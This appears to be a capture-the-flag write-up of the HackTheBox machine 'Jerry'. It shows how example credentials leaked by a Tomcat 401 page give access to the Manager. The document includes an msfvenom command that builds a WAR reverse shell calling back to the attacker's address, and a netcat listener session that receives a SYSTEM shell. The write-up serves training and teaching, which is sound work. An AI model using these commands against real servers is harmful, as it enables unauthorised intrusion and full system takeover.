# Jerry

## Engagement Notes

Jerry is a single-vector Windows box: one open port, an exposed Tomcat Manager, and
credentials handed over by the application's own error page. The whole path is
recon → harvest creds → spray → deploy a WAR reverse shell → SYSTEM. No privilege
escalation is required because the Tomcat service already runs with the highest
privileges on the host.

The reason this box is worth writing up isn't the exploit — it's two habits it
rewards: **treat any credential the target reveals as spray material**, and
**any place that accepts a module upload is a place to get a shell**.

## Attack path

1. `rustscan` finds only **8080/tcp** — Apache-Coyote, i.e. Apache Tomcat.
2. `curl` to `/manager/html` returns **401**, and the error body prints the
   example credentials `tomcat:s3cret`.
3. Spray those creds — they work.
4. Generate a WAR reverse-shell payload with `msfvenom`.
5. Upload/deploy it through the Tomcat Manager GUI.
6. Catch the shell with `nc` — land directly as `nt authority\system`.
7. `user.txt` and `root.txt` sit in the same folder ("2 for the price of 1").

## Enumeration

Only one port, and the service banner is the whole lead:

```console
$ rustscan -a jerry.htb
Open 10.129.136.9:8080
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127
```

Probing the Manager endpoint returns a 401 — but the 401 page itself documents
the example account, and Jerry never changed it:

```console
$ curl -v http://jerry.htb:8080/manager/html
< HTTP/1.1 401 Unauthorized
< WWW-Authenticate: Basic realm="Tomcat Manager Application"
...
  &lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
```

> 🧠 The lesson here is **credential harvesting from error output**. These aren't
> vendor-default creds baked into Tomcat — they're an *example* the box operator
> left in place. The rule to bank: any username/password a target reveals goes
> straight into the spray list. **Always password spray.**

## Foothold — Tomcat Manager → WAR reverse shell

Confirm the creds are accepted, then build the payload.
[revshells.com](https://www.revshells.com/) generates the `msfvenom` line faster
than recalling the flags by hand:

```console
$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.17.14 LPORT=9997 -f war -o shell.war
Payload size: 13031 bytes
Saved as: shell.war
```

Deploy `shell.war` through the Manager's "WAR file to deploy" form:

![Tomcat Manager deploy form with shell.war selected](/assets/images/ctf/events/htb-machines/jerry/tomcat-manager-deploy.png)

Once deployed, the app appears in the Manager application list as `/shell`:

![Tomcat Manager application list showing /shell deployed](/assets/images/ctf/events/htb-machines/jerry/tomcat-manager-apps.png)

Triggering `/shell` fires the reverse shell back to the waiting listener:

```console
$ nc -lvn 9997
Listening on 0.0.0.0 9997
Connection received on 10.129.136.9 49192
Microsoft Windows [Version 6.3.9600]
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

## Privilege escalation

None required. The Tomcat service runs as `nt authority\system`, so the foothold
*is* the highest privilege on the box.

> 🧠 This isn't surprising — services are routinely over-privileged — but the
> takeaway is the mindset, not the outcome: **strive for any level of access
> first.** Even a drop into an unprivileged service account still satisfies the
> objective and becomes the pivot point. A foothold counts as progress before a
> privileged shell does.

## Tactics (MITRE ATT&CK)

Only techniques whose official definition actually matches what happened on this box:

| Technique | ID | Why it applies |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Initial access via the internet-facing Tomcat Manager |
| Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) | Abusing the example `tomcat:s3cret` account — the technique explicitly covers example credentials |

> Not tagged, and why: **T1505.003 Web Shell** does *not* apply — a `java/shell_reverse_tcp`
> WAR is a one-shot reverse shell, not a persistent HTTP-accessed script
> ([definition](https://attack.mitre.org/techniques/T1505/003/)). **T1110.003
> Password Spraying** describes *many* accounts with a small password list
> ([definition](https://attack.mitre.org/techniques/T1110/003/)); here it was one
> account, so it stands as a *lesson*, not an accurate tag for this box.

## Lessons

- **Always password spray** — any credential the target reveals (even an example
  in an error page) is spray material.
- **Upload path → shell** — wherever an app accepts a module/package upload
  (WAR, plugin, theme), that's the reverse-shell delivery mechanism to reach for.
- **Any access counts** — establish a foothold at any privilege level before
  worrying about escalation.
